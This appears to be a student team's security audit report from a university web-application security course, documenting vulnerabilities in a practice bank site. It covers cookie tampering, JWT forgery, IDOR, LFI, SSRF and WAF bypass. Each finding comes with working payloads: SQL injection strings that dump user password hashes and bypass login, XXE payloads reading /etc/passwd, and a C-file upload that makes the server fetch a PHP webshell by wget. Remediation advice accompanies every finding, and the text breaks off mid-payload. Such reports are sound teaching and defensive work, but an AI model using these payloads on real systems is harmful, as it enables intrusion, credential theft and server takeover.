---
title: "Report - Week 1-5"
date: 2020-07-15T17:00:00+10:00

categories: ["Report"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# COMP6443 20T2 - Web Application Security

![](image3.png)

**-QBSITE- Security Audit**

<table>
  <tr>
   <td>
Usman Haidar
   </td>
   <td>
Aaron Min
   </td>
   <td>
Sean Smith
   </td>
   <td>
Andrew Wong
   </td>
   <td>Jennifer Xu
   </td>
  </tr>
  <tr>
   <td>

   </td>
   <td>

   </td>
   <td>

   </td>
   <td>
z5206677
   </td>
   <td>
   </td>
  </tr>
</table>

## Vulnerability Classifications

<table>
  <tr>
   <td><strong>CRITICAL </strong>
<p>
Vulnerabilities which result in access to critically sensitive data, system control, unauthorised admin privilege and bypass of server logic
<p>
<em>e.g. Server security misconfigurations, server side injection, sensitive data exposure</em>
   </td>
  </tr>
  <tr>
   <td><strong>HIGH</strong>
<p>
Vulnerabilities which affect the security of the platform, leading to unauthorised account control
<p>
<em>e.g. Session forgery, weak password reset, cookie tampering, privilege escalation, XSS, CSRF</em>
   </td>
  </tr>
  <tr>
   <td><strong>MEDIUM </strong>
<p>
Vulnerabilities which affect the privacy of the platform, leading to unauthorised access to data
<p>
<em>e.g. Security misconfigurations, file extension filter bypass, WAF Bypass</em>
   </td>
  </tr>
  <tr>
   <td><strong>LOW </strong>
<p>
Vulnerabilities which grant knowledge of restricted resources
<p>
<em>e.g. Knowledge of files and directories that should not be known</em>
   </td>
  </tr>
</table>

## Immediate Critical Vulnerabilities To Address

The following websites have critically classified vulnerabilities that should immediately be addressed. These vulnerabilities can lead to a breach of critical data, and total control of the system.

<table>
  <tr>
   <td>
<p style="text-align: right">
midsem4.-QBSITE-</p>
   </td>
   <td>
Financial loss to the business
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
gcc.-QBSITE-</p>

   </td>
   <td>
Total system control
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
letters.-QBSITE-</p>

   </td>
   <td>
Total system control
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
bigapp.-QBSITE-</p>

   </td>
   <td>
Account credential breach
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
pay-portal.-QBSITE-</p>

   </td>
   <td>
Data breach
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
kb.-QBSITE-</p>

   </td>
   <td>
Possible use as malicious proxy
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
*.feedifier.-QBSITE-</p>

   </td>
   <td>
Data breach
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
signin.-QBSITE-</p>

   </td>
   <td>
Account takeover
   </td>
  </tr>
</table>

## Site Assessment

### Subdomain Enumeration

**Vulnerability Details**

Subdomain Enumeration is the practice of finding subdomains of a given domain name. These can lead to the discovery of services on a network, and possibly the IP address of machines.

Basic subdomain enumeration can be performed by manually clicking through a website or utilising Google search’s “inurl:” or “site:” operators. More extensive subdomain enumeration can be performed by tools like `subbrute` which utilise extensive wordlists to find subdomains.

Subdomain enumeration allows attackers to form a model of a target site and can lead to the discovery of weak spots in the site’s infrastructure. Discovering subdomains is one major aspect during the reconnaissance phase in a cyber attack.

Other tools such as `altdns` can supplement DNS bruteforce tools by expanding the tools’ wordlists thus increasing the chances of retrieving valid subdomains. `altdns` takes in two lists: a list of known subdomains and words that could be present in subdomains under a domain (such as test, dev, staging). `altdns` generates a massive list of combinations of the two lists. These results can then be fed to tools like `subbrute` to use.

**Proof of Concept / Steps to Reproduce**

The following pages were discovered via bruteforce subdomain enumeration utilising `subbrute`:

- adserver.-QBSITE-
- banking.-QBSITE-
- blog.-QBSITE-
- careers.-QBSITE-
- creditcard.-QBSITE-
- dev-eu1.-QBSITE-
- dev.-QBSITE-
- m.-QBSITE-
- m.staging.-QBSITE-
- mobile.-QBSITE-
- staging-na1.-QBSITE-
- staging-na2.-QBSITE-
- super-secret.admin.-QBSITE-
- test.-QBSITE-
- vault42.-QBSITE-
- vault42.sandbox.-QBSITE-
- www-cdn-au.-QBSITE-
- www-cdn-hk.-QBSITE-
- www-cdn-us.-QBSITE-
- www-cdn.-QBSITE-
- www-dev.-QBSITE-
- www-preprod.-QBSITE-
- www-staging.-QBSITE-

This discovery can be reproduced with the following steps:

1. Download and set up `altdns`  
2. `./subbrute.py -QBSITE-`  
3. Run the program for as long as possible to retrieve subdomains.  

Other ways to reproduce:

- Manual site navigation and discovery
- Leaking functionality via html comments and JS console
- SPF and DMARC mail records
- `site:` or `inurl:` Google search operators

![](image9.png)

![](image6.png)

**Impact**

**Low Impact**

Subdomain enumeration is a key part of the reconnaissance (recon) process. Recon forms the first stage of most cyberattacks as “_narrowing down the addresses at which an organization hosts machines significantly reduces the preparatory work necessary to locate machines, map the topology, and launch an attack_”<sup>[1]</sup>.

Subdomain enumeration can be considered a low impact vulnerability. There is no way to mitigate subdomain brute-forcing tools without breaking DNS functionality. Subdomain enumeration becomes an issue when one of the domain names discovered resolves to the IP address of an insecure host, or a confidential domain name is discovered. At this point the vulnerability can be upgraded to a medium/high vulnerability.

**Remediation**

Possible steps to minimise the damage from brute force subdomain enumeration

1. Remove non-essential domain names and services from the public facing DNS

2. Use uncommon names

   To prevent wordlists discovering critical subdomains for an organisation such an accounts subdomain (i.e. accounts.-QBSITE-) it is recommended to use an uncommon name such `accounts.{some 5 digit combination}.-QBSITE-`. It is an extra layer of defence and increases the chances of not immediately being discovered by a wordlist brute force enumeration.<sup>[2]</sup>

3. Utilise a CDN/DDoS protection service (e.g Cloudflare)

   Cloudflare can mask the actual IP addresses that a domain name resolves to, making direct attacks much more difficult.

4. Utilise Honeypots

   A honeypot is a dummy program/service that gains information on attackers to understand their attacks. Attract a cyber attacker’s interest by placing dummy hostnames such as “`payments.-QBSITE-`” on networks completely isolated from production environments to lure cyber attackers.<sup>[2]</sup>

**References**

[1] [https://security.stackexchange.com/questions/92574/what-is-the-purpose-of-subdomain-enumeration](https://security.stackexchange.com/questions/92574/what-is-the-purpose-of-subdomain-enumeration) \
[2] [https://opendatasecurity.io/how-to-protect-your-business-from-brute-forcing-subdomains-attacks/](https://opendatasecurity.io/how-to-protect-your-business-from-brute-forcing-subdomains-attacks/)

### robots.txt Content Exposure

**Vulnerability Details**

robots.txt is a file that gives instructions to web robots (e.g. search index crawlers) about locations inside a website that the robots are allowed to or not allowed to crawl and index.

**Proof of Concept / Steps to Reproduce**

In the following pages from Quoccabank, robots.txt is present and details further pages that an attacker may use to further investigate.

- [files.-QBSITE-/robots.txt](https://files.-QBSITE-/robots.txt)
- [-QBSITE-/robots.txt](https://-QBSITE-/robots.txt)
- [gcc.-QBSITE-/robots.txt](https://gcc.-QBSITE-/robots.txt)
- [midsem1.-QBSITE-/robots.txt](https://midsem1.-QBSITE-/robots.txt)

An example of the output of a robots.txt located at -QBSITE- is show here:

![](image4.png)


**Impact**

**Low Impact**

Although the presence of robots.txt doesn’t present itself as a security vulnerability, it often is used by attackers to identify restricted or private areas of a website. In the example above ‘`easfs-admin-backup`’ details a vulnerable part of -QBSITE-. \

robots.txt files are not a means of protection, as they are not enforced by the robots. Crawlers can be designed to ignore the robots.txt file

**Remediation**

The robots.txt file is not a security threat in itself, where proper usage is beneficial for non-security related reasons. It is important regardless to make sure there are valid protections in place over unauthorised access to any paths disclosed in the robots.txt file.

**References**

[https://portswigger.net/kb/issues/00600600_robots-txt-file](https://portswigger.net/kb/issues/00600600_robots-txt-file)

### Cookie Tampering

**Vulnerability Details:**

Cookies are pieces of data that can be used by servers to identify your session from others. \
Because they are stored client-side, cookies are vulnerable to being locally modified.

**Proof of Concept / Steps to Reproduce**:

The following websites are vulnerable to cookie tampering.

- cookies.-QBSITE-

1. Change the cookie value for `lucky` from `0` (false) to `1` (true)  
2. Reload the page  

- bigapp.-QBSITE-

1. Create an account normally  
2. Locate the cookie `login-cookie`  
3. Decode the cookie to find `user@account:user`  
4. Change the cookie to be `user@account:admin` encoded in base64  

- sales.-QBSITE-

1. Intercept the request using a proxy  
2. Decode the cookie using base64 to find "`admin=0`"  
3. Change the cookie to be "`admin=1`" encoded in base64  

- midsem2.-QBSITE-

1. Observe that there is an authorisation cookie.  
2. Hash "`guest:no`" using MD5 to find that it matches  
3. Change the cookie to be MD5(“`admin:yes`”)  

**Impact**

**High Risk**

Storing data within cookies allow users to gain access to unintended sites when access controls are placed on the client side. In addition, tampering a cookie which contains authorisation details, such as setting admin as `true` or `false` in \_midsem2.-QBSITE- \_and \_sales.-QBSITE-, \_would allow users to escalate their privileges from a normal user to admin.

In the case of* bigapp.-QBSITE-* this could lead to the unauthorised addition, modification or deletion of database records. In the case for _sales.-QBSITE-_, stolen company data could result in an irreversible financial loss.

**Remediation**

1. Change the authentication and authorisation flow of the affected websites. Cookies should only be used for storing authentication details, and **not** for authorisation claims.
2. Cookies should not reveal important information, only a method to verify who the user is, rather than what the user can access.

### Security Misconfiguration

#### JWT Verification

**Vulnerability Details:**

JSON Web Tokens are an open standard which defines a compact and self contained-way to transmit information between client and server as a JSON object. \
JWT is made up of 3 parts: header, payload and signature. The signature is signed with a secret HMAC algorithm or public/private key pair (RSA/ECDSA) to ensure that the claims (information) can be verified and trusted tamper-proof.

However, if a site does not verify the signature, any header and payload will be accepted by the server, and considered legitimate and valid.

**Proof of Concept / Steps to Reproduce**:

The following websites are vulnerable

- notes.-QBSITE-

1. Visit the notes.-QBSITE- site to get a JWT token in the `notes_auth` cookie  
2. Decode the JWT token with a JWT decoder  

![](image12.png)

3. Change the username to `admin@-QBSITE-` and then edit the expiry time to be after the current time.

   Since the signature is not verified, we can simply change the cookie into our newly encoded cookie and gain access to the admin’s notes.

**Impact**

**High Risk**

This vulnerability poses a high risk, as the lack of JWT signature verification results in any token being considered valid and trusted. This is a huge security privacy concern as an attacker can easily spoof the identity of any user, gaining access to their notes.

**Remediation**

A simple fix would be to verify the signature, and reject the token if the signature validation fails.

**References**:

[https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage) \
[https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

#### Weak Passwords

**Vulnerability Details**

A weak password can be either short, commonly used, a system default password or something that could be easily guessed by executing a brute force attack using a subset of possible passwords. Such examples include words in the dictionary, name of relatives, or passwords that can be guessed from the user id/name.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- blog.-QBSITE-

1. Open the login page for the website  
2. Find a valid username  
3. Bruteforce or try some simple password to login into their account.  
   _For example username:admin, password:admin, username:mq_

A common list of passwords can be found in the rockyou.txt password list

**Impact**

**High Risk**

This vulnerability poses a high risk, as simple passwords can be easily brute forced, which may result in unauthorised access and information leakage of accounts. This can be severe if the vulnerable account has administrative privileges.

**Remediation**

- Use non-dictionary based passwords that are difficult to brute force (in reasonable time)
- Administrators should enforce a strong password policy, not allowing weak passwords or password based on dictionary words.

**References**

[https://www.acunetix.com/vulnerabilities/web/weak-password/#:~:text=A%20weak%20password%20is%20short,common%20variations%20on%20these%20themes.](https://www.acunetix.com/vulnerabilities/web/weak-password/#:~:text=A%20weak%20password%20is%20short,common%20variations%20on%20these%20themes.)

#### Legacy Systems

**Vulnerability Details**

Legacy systems are old services that have been replaced with a new platform. They are often replaced rather than improved due to it being easier to redesign the platform from the ground up, than to work around old and buggy code. However, due to the often large number of services deployed by a company, it is not uncommon for legacy systems to be accidentally left active and publicly accessible.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- files.-QBSITE-/admin

The above site is a legacy administrative interface which is guarded by a 4 digit code.  
There are only 10 × 10 × 10 × 10 = 10000 combinations, which is trivial to brute-force.

The platform also does not have any rate-limiting or lockout features, which allows for a successful bruteforce in a matter of minutes

**Impact**

**High Risk**

Legacy systems pose a high security risk, as they are unmaintained and often contain vulnerabilities which can be exploited. As legacy systems are often still semi-functional, these vulnerabilities can serve as attack vectors to gain access to the system, infrastructure or data

**Remediation**

- Deprecated and legacy systems should be taken offline immediately

#### Directory Listing

**Vulnerability Details**

Web servers often provide functionality to list the contents of the current directory if an index page was not found. This can be a security implication, as the contents of a directory is revealed to the user - which may often be undesirable.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- kb.-QBSITE-/deep

A directory crawler can be written to map out the structure of the pages

**Impact**

**Low Risk**

There is little to no risk for the kb.-QBSITE- site as there is no sensitive content that exists within the site. However there may be a security concern if directory listing is enabled on another server which does house sensitive data.

**Remediation**

- Advisory to disable the directory listing functionality of the web server. \
  Due to the nature of the file names, it would be very difficult to quickly enumerate through the pages of the site.
- Apply proper access control for files that should be secure

### Insecure Direct Object Reference

#### URL Manipulation / Enumeration

**Vulnerability Details**

URL enumeration (_also referred to as Forced Browsing/Predictable Resource Location, File Enumeration, Directory Enumeration, and Resource Enumeration_) is the process of “_enumerating and accessing resources that are not referenced by the application, but are still accessible_”<sup>[1]</sup>.

**Proof of Concept / Steps to Reproduce**

- midsem5.-QBSITE-

  Upon opening the poem, we notice the link containing a query which is base64 encoded. Since the query decodes to <code>poem-002.txt<em>. </em></code>Enumeration can be performed on<em> <code>poem-\*.txt</code></em> to access other poems provided on the website.

- support.-QBSITE- 

  Similarly, `support.quoccbank.com` contains a base58 encoded query.

The query decodes to the format _user:note_.  
By enumerating users and note IDs, notes of other users can be accessed

- blog.-QBSITE-/?p=2

  Enumerating page ID (by modifying the `p` query value), results in access to a page that was not publicised on the website.

- files.-QBSITE-

  Create a new account and then a new file.  
  The URL is in the format `files.-QBSITE-/document/<name>?r=<username|base64>`.  
   Previously from logging in, we know that the username admin exists, so we can brute force the file names.

**Impact**

Accessing another user’s data by simply forging our own link poses an invasion of privacy for users. Though this does not directly bring financial loss to Quoccabank, it does allow users with malicious intent to gain further information about users of Quoccabank and perform a bigger attack by building up on details gained.

**Remediation**

Checking access privileges before allowing any user to access a URL. Encoding parameters for queries is not necessarily a vulnerability in itself, as it allows for clear communication between the client and server. However, client side authorisation should be done before allowing users to visit sites which are not intended for them.

**References**

[1] [https://owasp.org/www-community/attacks/forced_browsing](https://owasp.org/www-community/attacks/Forced_browsing)

#### Body Manipulation

**Vulnerability Details**

Body manipulation falls under the category of a “Web Parameter Tampering Software Attack”. This entails modifying the parameters sent from a client to the server (via intercepting the request or otherwise). This change in the parameters ideally results in a modification of the application data such as login details and price/quantity of products.<sup>[1]</sup>

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- account.-QBSITE-

A user can execute the following JS code, allowing them to check the 'confirmed' checkbox

```
document.querySelectorAll('[readonly]').forEach(e=>e.removeAttribute('readOnly'))
document.querySelectorAll('[type=checkbox]').forEach(e=>e.checked=true)
```

This will allow the user to open their account without staff confirmation

- card.-QBSITE-

The bank card fees can be changed by intercepting the request and changing the parameter `fee` to 0. Then the request successfully goes through and the user is able to order a card for free.

- midsem4.-QBSITE-

The price of the Q4 flag can be modified to \$0, allowing the purchase of flags greater than the user's account balance

**Impact**

Users are able to alter data which they should not be able to (i.e. staff only fields, price). As a result, users can verify themselves and bypass staff validation and payment checks. This could lead to unauthorised usage of bank details, financial loss when a user goes over credit usage under a fake identity. This is a very critical concern as it directly affects QuoccaBank’s main functionality.

**Remediation**

The data flow model should be changed, such that staff-only and pricing data is not controllable by the client. This should involve implementing server-side logic, and only requiring the user to send user-related data.

**References**

[1] [https://owasp.org/www-community/attacks/web_parameter_tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)

#### Privilege Escalation

**Vulnerability Details**

Privilege escalation attacks enable a user to elevate their account permission level without authority from an administrator or manager. This grants the user higher levels of access and functionality of the platform.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- files.-QBSITE-

An publicly accessible staff page accessible at `files.-QBSITE-/#/staff/wfh` outlines the procedure to grant staff access to any arbitrary user

By accessing the below endpoint, the user (`USERNAME)` will be elevated to the Staff role

```
files.-QBSITE-/covid19/supersecret/lmao/grant_staff_access?username=USERNAME
```

**Impact**

**High Risk**

Privilege escalation attacks are very dangerous, as they grant attackers administrative access.  
The escalated account will then be able to perform any administrative action, which may compromise the security of the system, and the privacy of data.

**Remediation**

Secure access to the `files.-QBSITE-/#/staff/wfh` page, by means of IP filtering, authorisation or password access

### Local File Inclusion

**Vulnerability Details**

Local File Inclusion (LFI) is a type of web vulnerability that is used to trick the web application into exposing or running files on the web server and is most commonly found to affect web applications that rely on a scripting run time. An LFI attack may lead to information disclosure, remote code execution, or even cross site scripting.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable:

- letters.-QBSITE-

  Insert `\input{/filepath}` into the message body

  This will cause the LaTeX engine to render the contents of `/filepath` in the output

- gcc.-QBSITE-

By accessing [https://gcc.-QBSITE-/upload.php](https://gcc.-QBSITE-/upload.php) when we have not uploaded a file, we can see this error:

![](image8.png)

This directory leakage allows us to craft this malicious C file to upload:

```
#include "/quocca-gcc/upload.php"
```

Which when uploaded, will allow us to see this error message:

![](image7.png)

In this error message, we are able to further deduce what the backend is doing as well as directory exposure that is web accessible at “[https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/](https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/)”. From here, we know where files are uploaded, and furthermore an attacker can potentially craft a remote code execution or remote file inclusion attack.

**Impact**

**Critical Risk**

LFI vulnerabilities allow an attacker to open, discover, read and extract arbitrary files that exist in the system. This may allow an attacker to exfiltrate confidential and critical data - such as password files, logs, configurations, etcetera

**Remediation**

- Disable file inclusion/loading from the runtime host
- Sanitise user input before being parsed by the runtime
- Enforce access permissions to the file system
- Run the web application as a restricted user

**References**

[https://en.wikipedia.org/wiki/File_inclusion_vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)

[https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)

### Remote Code Execution

**Vulnerability Details**

Remote code execution refers to when an attacker gains access and is able to run arbitrary malicious software. In combination with Command Injection and Remote File Inclusion, an attacker can inject a payload that allows the attacker to execute operating system commands.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable:

- letters.-QBSITE- \

1. Enable the shell escape option in the LaTeX engine by passing the debug option

   ```
   -shell-escape.ZYO1d05uy-FCZuQ_fSzoDfjkipM
   ```

2) Add the payload in the message body

   ```
   \input{|"echo $(ls / | base64)"}
   ```

- gcc.-QBSITE-

1. Craft a C file `vuln.php.c` that contains PHP code as a string (as to be valid C syntax)

```
   #include <stdio.h>

   int main(void) {
    	printf("<?php shell_exec('wget -O reverse.php https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php'); ?>");
    	return 0;
    }
```

2.  Upload the `vuln.php.c` file to the GCC service  
3.  The compiler will then generate a "C program" `vuln.php` which can be located at \
    <code>[https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/1594744207_vuln.php](https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/1594744207_vuln.php)</code>
4.  Open the <code>vuln.php</code> C program - which the server executes as a PHP file (by extension).  
    A reverse shell will be remotely downloaded to <code>reverse.php</code>  
5.  Launch the remote web shell [https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/reverse.php](https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/reverse.php)

    <em>Alternatively, the reverse shell code could also be added as a string to the C code which could then further be viewed at [https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/<GeneratedNumber>\_vuln.php](https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/1594702758_shell.php) </em>

An example of an injected reverse shell is shown here:

![](image11.png)

**Impact**

**Critical Risk**

An attacker is able to execute operating system commands such as directory traversing, reading files or uploading files. By injecting a web reverse shell, an attacker also has a simpler and easier access point to stage their attack.

**Remediation**

For letters.-QBSITE- - the debug option should be secured by other means other than an encryption key; for example by IP whitelisting, account authorisation, etc

For gcc.-QBSITE-, the web server should be configured to not execute detected PHP files in any public directory. Additionally, spawning calls such as ‘shell*exec’ in PHP should be disabled. Further care could also be emphasised towards filename generation where for example, instead of "`<fileID>_filename`", the order can be inverted into, "`filename*<fileID>`" so that a trailing file extension string is ignored.

**References**

[https://www.acunetix.com/blog/web-security-zone/os-command-injection/](https://www.acunetix.com/blog/web-security-zone/os-command-injection/)

[https://www.drizgroup.com/driz_group_blog/what-is-remote-code-execution-attack-how-to-prevent-this-type-of-cyberattack#:~:text=Remote%20code%20execution%20(RCE)%20refers,arbitrary%20malicious%20software%20(malware).](<https://www.drizgroup.com/driz_group_blog/what-is-remote-code-execution-attack-how-to-prevent-this-type-of-cyberattack#:~:text=Remote%20code%20execution%20(RCE)%20refers,arbitrary%20malicious%20software%20(malware).>)

### SQL Injection

**Vulnerability Details**

SQL injection is a code injection technique that allows the attacker to take over the queries that an application makes to its database. This may allow an attacker to read sensitive data from the database, modify database data, execute administration operations on the database, recover the content of a given file present on the server and even issue commands to the OS.

**Proof of Concept / Steps to Reproduce**

#### Data Retrieval

- bigapp.-QBSITE-

  

  Table names can be found by injecting the following string in the search query


```
')) UNION SELECT table_schema,table_name,1,1,1,1 FROM information_schema.tables -- .
```



Columns of a table can be found by injecting the following string in the search query


```
')) UNION SELECT COLUMN_NAME,2,3,4,5,6 from information_schema.columns WHERE TABLE_NAME='>>TABLENAME<<'-- .
```



Accounts (+ passwords) can be exfiltrated from the database by injecting the following


```
')) UNION SELECT email, userid, password, type, fname, lname from users -- .
```

This account data leak is particularly dangerous, as it returns the MD5 password hashes of all users. A simple reverse lookup of the MD5 hash can reveal plain-text passwords</em>

Products can be exfiltrated from the database by injecting the following


```
')) UNION SELECT * from bproducts -- .
```



An example of SQL injection exposing information schema tables is on bigapp.-QBSITE- is shown here:

![](image10.png)

- pay-portal.-QBSITE-

  Data can extracted by injecting the following, which will reveal the initially hidden entries


    ```
    " OR 1=1 -- .

    ```

#### Authentication / Access Bypass

- bigapp.-QBSITE-

  Can login into pre-existing user’s account without knowing the password


    Enter `USER_NAME' OR 1=1; -- .` in the email field and type a password to gain access


    Can create an account with the same email


    Enter `EMAIL_ADDRESS' or 1; -- .` into the email field of the registration form request

- signin.-QBSITE-

1.  Utilising QDNS, set up a PTR entry from the attacker's IP address to a malicious domain where the domain’s DNS TXT carries the following payload

        ```
        ', last_reset=CONCAT(?, ?, ?), password="password" WHERE email='user@-QBSITE-' -- .
        ```

2)  Perform a password reset on signin.-QBSITE-

The DNS lookup contents will be unsafely handled in the SQL query. 
This will cause the password for `user@-QBSITE-` to change to `password`

**Impact**

**Critical Risk**

By gaining control of the SQL query, attackers gain the ability to leak sensitive data stored in a database. They may also be able to bypass check mechanisms.

In the event of bypassing/altering authentication checks, an attacker will be able to compromise any user account and gain access to their data without requiring a password.

In the event of bypassing/altering registration checks, an attacker may be able to perform a denial of service attack, preventing a legitimate user from accessing their data.

**Remediation**

- Parameterised queries (if implemented properly) will prevent the string escaping of user-fed input.
- Use stored procedures to perform functions
- Grant only the minimum required privileges to the servicing SQL account
- Perform input validation / whitelist of queries

**References**

[https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

[https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

[https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### XML External Entity

**Vulnerability Details**

In an attempt to be more robust in terms of data sources and structures, XML files can load and parse DTD (External Entity) files which are returned as part of the XML file. However, the loading of a maliciously crafted External Entity can lead to security implications

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- v1.feedifier.-QBSITE-
- v2.feedifier.-QBSITE-
- v3.feedifier.-QBSITE-
- v4.feedifier.-QBSITE-

Point the feedifier RSS URL to the location of a publicly accessible XML payload containing:

```
<!DOCTYPE ree [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss>
	<channel>
		<item>
			<title></title>
			<link></link>
			<description>&xxe;</description>
		</item>
	</channel>
</rss>
```

Where a WAF is employed to sanitise the payload, the exploit string can be split up in the DTD:

```
<!ENTITY % A "file:">
<!ENTITY % B "///etc/pa">
<!ENTITY % C "sswd">
<!ENTITY % PATH "%A;%B;%C;">

<!ENTITY % prepare '<!ENTITY &#37; contents SYSTEM "%PATH;">'> %prepare;
<!ENTITY % vuln '<!ENTITY &#37; exploit SYSTEM "%contents;">'> %vuln;

%exploit;
```

Where a WAF is employed to check **ONLY** HTTP(S) links, other protocols like FTP can be used

```
<?xml version="1.0" ?>

<!DOCTYPE root [
	<!ENTITY % here SYSTEM "ftp://<FTPDomain>/payload.dtd">
	%here;
	%there;
	%where;
]>

<rss version="2.0">
	<channel>
    	<item>
        	<title>&found1;</title>
        	<link>link</link>
        	<comments>comments</comments>
        	<description>&found2;</description>
    	</item>
	</channel>
</rss>
```

Where a WAF is employed to block outbound network activity, a locally stored DTD file can be tricked to execute the payload

```
<!DOCTYPE data [
	<!ENTITY % importDocbook SYSTEM "file:///usr/share/sgml/docbook/dtd/4.5/docbookx.dtd" >
	<!ENTITY % ISOamso '<!ENTITY &#37; contents SYSTEM "file:///etc/passwd"><!ENTITY &#37; vuln "<!ENTITY &#38;#37; yeet SYSTEM &#39;&#37;contents;&#39;>">'>

	%importDocbook;
	%vuln;
]>

<rss>
	<channel>
		<item>
			<title></title>
			<link></link>
			<description></description>
		</item>
	</channel>
</rss>
```

On v[123].feedifier.-QBSITE-, here is an expected example:

![](image1.png)

Compared to an XXE attack exposing `/etc/passwd`:

![](image2.png)


**Impact**

**Critical Risk**

XXE vulnerabilities are attack vectors which can be utilised for File Inclusion, SSRF, and RCE exploits. They allow arbitrary files both locally on the system, but also remotely on another network to be open and read - which may disclose critically confidential data. RCE can also be performed, giving an attacker shell access. XXE vulnerabilities can also lead to Denial of Service attacks, where a specially crafted payload can cause high processing load for the server

**Remediation**

Disabling of external entities is strongly advised, as it will mitigate this attack vector - which will prevent the aforementioned risks of File Inclusion, SSRF, RCE and DoS attacks.

**References**

[https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

[https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

### Server Side Request Forgery

**Vulnerability Details**

SSRF attacks allow an attacker to control what and where a server function routine operates on. Server Side Request Forgery vulnerabilities arise from a lack of sufficient user input handling.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- haas.-QBSITE-

The website at `kb.-QBSITE-` is not publicly accessible, and can only be reached through `haas.-QBSITE-`. The `haas.-QBSITE-` site can be fed any arbitrary HTTP payload which will be sent to and parsed by the Quoccabank CTFProxy.

```
GET / HTTP/1.1
Host: kb.-QBSITE-
```

This payload will cause the `haas.-QBSITE-` server to contact the kb.-QBSITE- site successfully, granting access to the site

Tools such as [KB Proxy](https://featherbear.cc/UNSW-COMP6443/post/tools/kb_proxy/) can be used to automatically tunnel requests through haas.-QBSITE- making it trivial to bypass access restrictions.


**Impact**

**Critical Risk**


Whilst haas.-QBSITE- is intended to be a HTTP tunneling service - there are no restrictions as to which Quoccabank sites it can access. Furthermore, all requests to all endpoints are performed under the `[haas@services.-QBSITE-](mailto:haas@services.-QBSITE-)` account. Consequently, the haas.-QBSITE- site is vulnerable as an anonymising platform for malicious attacks

**Remediation**

- Implement a whitelist of allowed target QuoccaBank destinations.
- Restrict access of haas.-QBSITE- to only required users

### Web Application Firewall Bypass

#### Input Sanitisation

**Vulnerability Details**

To mitigate inline command substitution and string escaping vectors, applications might strip away string quotation characters and other "escape" characters (`\`, \`\`, `'`, `"`, ```, `$`). However, if not performed correctly, and holistically; input sanitisation can be circumvented.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- signin.-QBSITE-

The QDNS service strips away the `` '` `` (apostrophe) ` character, making it impossible to escape out of the query string; however no sanitisation is performed during the insertion of the reverse DNS lookup result.

1. Gain control of a domain name
2. Create a TXT record to `test.YOUR.DOMAIN` that contains a single `` '` `` (apostrophe) `
3. Register `test.YOUR.DOMAIN` to your IP through QuoccaBank's QDNS Service
4. Perform a password reset


**Impact**

**Medium Risk**  

Bypassing input sanitisation mechanisms grant the attacker to gain control over query strings which allow for other exploits to be used, such as RCE, SQLi, XXE, etc.

**Remediation**

- Ensure input sanitisation is performed during all stages of string insertion and concatenation
- Opt to use secure string replacement strategies

#### Keyword Filtering

**Vulnerability Details**

In an attempt to mitigate common attack vectors, application firewalls may implement a keyword blacklist - which will raise an error if any item in the blacklist appears in the request string. However, a blacklist can only prevent attacks that have been listed/hardcoded. Security issues may occur if a blacklisted keyword were to be dynamically formed (i.e. string concatenation)

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- v2.feedifier.-QBSITE-
- v3.feedifier.-QBSITE-

The above sites blacklist the `flag`, `file:/` and `etc` keywords, preventing us from directly accessing `file:///etc/passwd`.

1. Create an RSS XML file with the contents

   ```
   <?xml version="1.0" encoding="UTF-8" ?>

   <!DOCTYPE a [
